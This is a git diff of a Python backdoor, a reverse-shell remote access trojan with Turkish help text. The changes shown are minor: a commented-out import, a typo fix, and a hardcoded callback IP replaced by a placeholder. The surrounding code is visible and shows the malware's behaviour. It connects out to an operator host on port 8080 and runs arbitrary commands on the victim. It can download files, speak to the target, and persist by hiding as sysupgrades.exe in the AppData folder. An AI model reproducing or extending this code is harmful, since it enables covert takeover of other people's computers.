@@ -5,7 +5,7 @@ import os
 import base64
 import pyautogui
 import pyttsx3
-import pkg_resources.py2_warn
+#import pkg_resources.py2_warn
 import sys
 import shutil
 
@@ -44,7 +44,6 @@ class MySocket:
 		with open(path,"wb") as my_file:
 			my_file.write(base64.b64decode(content))
 			return "indirme başarılı"
-
 
 
 	def system_name(self):
@@ -130,11 +129,10 @@ class MySocket:
 
 
 
-
 	def help(self):
 		a = """\n
 
-		* whomı / benkimim  \t\t\t\t\t\t>>>\tişletim sisteminin adını verir. 	
+		* whoamı / benkimim  \t\t\t\t\t\t>>>\tişletim sisteminin adını verir. 	
 
 		* exit / çıkış  \t\t\t\t\t\t>>>\tbağlantıyı kapatır. 	
 
@@ -179,7 +177,8 @@ class MySocket:
 		* speak / konuş  \t\t\t\t\t\t>>>\thedefe seslenme.					
 			Ör: speak <ı hack you>
 		* migrate / taşı  \t\t\t\t\t\t>>>\tArkaKapıyı bilgisayarda saklar ve kendini yeniden başlatır.
-		* rmMigrate / silMigrate \t\t\t\t\t\t>>>\tArkaKapıyı siler  
+
+		* rmMigrate / silMigrate \t\t\t\t\t>>>\tArkaKapıyı siler  
 
 
 			\n"""
@@ -234,7 +233,6 @@ class MySocket:
 				elif command[0] == "rmMigrate" or command[0] == "silMigrate":
 					new_file = os.environ["appdata"] + "\\sysupgrades.exe"
 					command_output = self.delete_persistence(new_file)
-
 				else:
 					command_output = self.command_execution(command)
 			except Exception:
@@ -243,7 +241,7 @@ class MySocket:
 		self.my_connection.close()
 
 
-ConfigSocket = MySocket("192.168.1.63",8080)
+ConfigSocket = MySocket("ip",8080)
 
 ConfigSocket.start_socket()
 
